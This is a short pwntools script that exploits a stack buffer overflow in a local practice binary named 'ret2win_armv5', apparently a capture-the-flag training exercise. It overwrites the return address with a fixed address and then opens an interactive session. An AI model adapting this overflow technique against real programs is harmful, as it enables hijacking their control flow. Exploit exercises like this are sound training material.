from pwn import *
io = process("./ret2win_armv5")

payload = b"A"*32 + b"B"*4 + p32(0x000105ec)
io.sendline(payload)
io.interactive()
